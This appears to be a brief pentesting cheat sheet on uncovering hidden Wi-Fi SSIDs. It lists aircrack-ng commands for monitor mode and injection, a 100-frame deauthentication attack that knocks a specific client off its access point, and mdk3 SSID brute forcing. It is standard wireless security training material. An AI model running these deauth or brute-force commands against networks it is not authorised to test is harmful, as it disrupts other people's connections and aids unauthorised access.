# How to find hidden SSIDs
Hiding SSIDs is a superficial attempt at masking SSIDs from casual users and attackers by making it less visible. 2 methods to get their ESSID, deauth and bruteforcing.

---

## Setup
Set router to max power
```
ifconfig wlan1 down
```
```
iwconfig wlan1 txpower 30
```
```
ifconfig wlan1 up
```
Preemptively kill everything that gets in your way:
```
airmon-ng check kill
```
Start monitor mode:
```
airmon-ng start wlan1
```
Run a test:
```
aireplay-ng --test wlan1mon
```
Should see `Injection is working!`

Save what's out there and save to a file:
```
airodump-ng wlan1mon --band agp -w dump
```

---

## Deauth
If there are clients connected to hidden networks you can deauth them, then capture the request they send to re-connect which will contain the ESSID / network name.
Run airodump live to see ESSID update:
```
airodump-ng wlan1mon --band agp
```
Deauth target client MAC (`-c`) with AP MAC (`-a`)  (both found in dump):
```
aireplay-ng -0 100 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan1mon
```

## Brute forcing hidden SSID
With `mdk3`, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names:
```
mdk3 <interface> <test mode> [test_ options]
```
Brute forcing all possible values:
```
mdk3 wlan1mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
```
Brute forcing using a wordlist:
```
mdk3 wlan1mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
```
